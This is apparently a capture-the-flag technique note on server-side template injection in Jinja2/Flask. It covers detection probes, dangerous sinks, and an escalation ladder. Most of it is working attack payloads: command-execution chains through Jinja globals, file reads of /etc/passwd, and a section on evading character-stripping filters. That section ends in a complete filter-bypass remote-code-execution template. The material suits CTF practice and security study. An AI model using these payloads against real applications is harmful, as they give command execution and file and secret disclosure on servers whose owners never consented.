# ssti

## Metadata

Title: ssti
Tags: ssti, jinja2, python, flask, rce, template-injection, filter-bypass
Technique: ssti

## Detection methodology

1. Find the sink before trying payloads: any user value that reaches a
   template engine.
2. Probe with a harmless arithmetic expression first:
   `{{7*7}}` or `{{7*'7'}}`.
   - `49` -> expressions are evaluated (full SSTI).
   - `7777777` -> concatenation, weaker position, look for other sinks.
   - reflected literally -> no SSTI on that parameter, keep looking.
3. Confirm the engine before escalating. Jinja2 clues: `{{config}}`,
   `{{request}}`, `{{self.__class__}}`, `{{''.__class__}}`.
   Other engines (Twig, Freemarker, ERB, Velocity, Smarty) need different
   syntax - do not reuse a Jinja chain blindly.
4. Confirm real execution, not reflection, by running a command and reading
   the result back.

## Dangerous sinks

Python / Jinja2:

- `render_template_string(user_input)` - Flask, the single most common cause.
- `Template(user_input).render()` and `Environment.from_string(...)`.
- Building a template with string concatenation or f-strings that embed
  request data.
- Generic: any `"... " + request_value` fed to a template engine.

Web frameworks to inspect for the same pattern: Flask, Django
(`Template`/`render_to_string`), Jinja2 used directly, and any custom
"preview / announce / report / name / email / comment" feature - these are
classic injection points because they are designed to render user content.

## Payload templates

Detection and introspection:

```text
{{7*7}}
{{config}}
{{request}}
{{''.__class__}}
{{self.__class__.__mro__}}
{{[].__class__.__base__.__subclasses__()}}
```

Command execution (Python `os` through the Jinja globals):

```text
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('id',shell=True,stdout=-1).communicate()}}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__['os'].popen('id').read() }}
```

Variants that need no quotes in the command:

```text
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[0]('id',shell=True,stdout=-1)}}
```

Reading files without a shell, using builtins only:

```text
{{open('/etc/passwd').read()}}
{{''.__class__.__mro__[-1].__subclasses__()[0]('/etc/passwd').read()}}
```

## Escalation ladder

1. Arithmetic probe -> is it evaluating?
2. `{{config}}` -> is the environment reachable?
3. `popen(...).read()` -> command execution as the app user (often root in
   throwaway lab containers - check with `id`).
4. Locate the target: `find / -maxdepth 4 -iname '*flag*' 2>/dev/null`,
   `ls -la /`, `ls -la /app /challenge /home`.
5. Read it, then **verify** the read was complete (`wc -c`, `md5sum`,
   `od -c`) before reporting success.

## Practical notes

- **Where does the output go?** If the injected value is only ever shown to
  the submitter, there is no bot to abuse: read the output directly and do
  not build an exfiltration chain. If a hint mentions an admin/viewer/cookie,
  then the output is invisible to you and XSS-style exfiltration is required
  instead.
- **Redirects are normal.** Many apps POST then redirect (303/307) to a
  result page. The injection output appears on the *final* page, so always
  follow the redirect before judging a payload.
- **Chunk long output.** A template rendering an entire file or directory
  listing may be truncated by the page or the request; read a file slice at a
  time (`head -c`, `sed -n`) and confirm byte counts.
- **One command per request.** Concatenating several commands in one
  expression risks output that carries raw markup and breaks the surrounding
  render (observed as HTTP 500). Isolate commands when output is untrusted.
- **Quotes and filters.** If `'`, `"` or `_` are stripped or blocked, use
  `chr()`/`attr()`/`[]` indexing instead of literal attribute names, or read
  the missing value back out of a request header/meta you control and reuse
  it.

## Sandboxed / non-RCE targets

If commands do not run, the template still gives you:

- File read: `{{open('file').read()}}`
- Config/secret disclosure: `{{config}}`, `{{config.items()}}`
- Python object introspection: `{{''.__class__.__mro__}}`,
  subclasses enumeration, attribute walking off any reachable object.
  A reachable class whose constructor takes `(path, mode)` is enough to read
  a file; one that takes `(cmd, shell=True)` is enough to execute.

## Detection checklist

- [ ] User input reaches `render_template_string` / `Template(...)`?
- [ ] `{{7*7}}` evaluates?
- [ ] `{{config}}` reveals an app config with secrets?
- [ ] `popen` chain works?
- [ ] Flag located and read completely (`wc -c` / `md5sum`)?
- [ ] Anything that blocks the *usual* client-side path (no bot, no
      cross-user visibility) means the answer is server-side anyway?

## Bypassing character-stripping filters

A very common hardening step is a regex that *removes* characters before the
template is rendered, e.g. `re.sub(r'[_\[\.]', "", value)`. This defeats the
usual payloads but not the template language itself.

### 1. Characterise the filter, never guess it

Submit one character per request wrapped in known-good text (`A<char>B`) and
diff the output. Two outcomes per character:

- character disappears -> it is **stripped**
- whole value replaced by a taunt/warning -> a **pattern rule** or an
  exception handler fired

This turns a guess into a fact in a couple of requests, and it also reveals
substring rules (e.g. an alternation that also removes `base`).

### 2. Rebuild blocked characters with `\xNN` escapes

**Jinja string literals support `\xNN` escapes** (the lexer decodes them with
`unicode-escape`). The filter never sees the real character - it only sees
the escape - so:

```text
'\x5f'  ->  _        '\x2e'  ->  .
'\x5b'  ->  [        '\x5d'  ->  ]
'\x27'  ->  '        '\x22'  ->  "
'\x7c'  ->  |        '\x20'  ->  (space)
```

Store the character once with `{% set %}` (block tags are usually not
filtered) and build names by concatenation:

```text
{% set u='\x5f' %}{{ u+u+'class'+u+u }}
```

The same trick works for any expression: `{{ '\x5f'~'\x5f'~'globals' }}`.

### 3. Reach objects with `|attr()` when `.` and `[]` are gone

`attr` is a filter, so it needs no dot:

```text
config|attr('__class__')
```

Two facts that decide whether the chain works:

- **In Jinja >= 3.1 `attr` performs `getattr` only** - the item-lookup
  fallback was removed. So `globals_dict|attr('os')` returns Undefined and
  renders as **empty output**. Get dict keys through a dict *method*
  instead: `|attr('get')('os')`.
- **Calling the result of a filter is valid**: `|attr('read')()` works, which
  removes the need for `.read()`.

Full no-dot, no-bracket, no-underscore RCE template:

```text
{% set u='\x5f' %}{{ (config|attr(u+u+'class'+u+u)|attr(u+u+'init'+u+u)|attr(u+u+'globals'+u+u)|attr('get')('os')|attr('popen'))('id')|attr('read')() }}
```

Replace `config|attr(...__init__)` with `lipsum|attr(u+u+'globals'+u+u)` or
`cycler|attr(...)` when the app config object is not reachable.

### 4. The filter also eats your shell command

The strip runs over the **whole request value**, so the command string is
damaged too:

- `cat /challenge/app.py` becomes `cat /challenge/apppy` -> the shell writes
  the error to stderr and `popen(...).read()` returns `""`.
- A substring rule such as `base` turns `base64` into `64`.

Fix: encode the blocked characters inside the command as well -
`popen('cat /challenge/app\x2epy')`. Jinja decodes them before `popen` runs.

### 5. Silent empty output is a signal

With `popen(...).read()` a failing command yields an **empty render**, not an
error. Treat empty output as "my command was mangled or failed", and
re-check the command string for stripped characters before concluding the
target is empty.

### 6. Blocked characters outside Jinja

- `chr()` and other function calls can rebuild characters if you have any
  callable reachable.
- Request-controlled values are echoed back into the template context
  (`request`, `request.args`, `request.headers`, `request.form`): send the
  needed character in a header or query parameter and pull it back out with
  `|attr('get')` - useful when a *substring* (not just a character) is
  blocked and escapes cannot express it.
- For substring blocks that cannot be escaped, build the name from
  concatenation of surviving pieces plus recovered characters.

## Reading the filter source

When the app already lets you execute code, spend one request reading its own
source (`cat app.py`). It reveals, in a single shot:

- the exact filter expression (which characters/substrings are removed),
- whether a taunting message is a WAF or just `except TemplateSyntaxError`,
- where the flag file lives.

## Taunting messages are often exception handlers

`Stop trying to break me >:(` style output frequently comes from the
application's own error handling:

```python
try:
    return render_template_string(user_input)
except TemplateSyntaxError:
    return render_template_string("Stop trying to break me >:(")
```

Diagnostic value: it tells you the payload was **mangled into invalid syntax**
rather than explicitly blocked. Distinguish the two cases:

- message appears -> payload became a syntax error (characters were removed)
- empty output -> payload parsed fine but produced an undefined/empty value
  (for example a `dict` key read through a getattr-only `attr` filter)
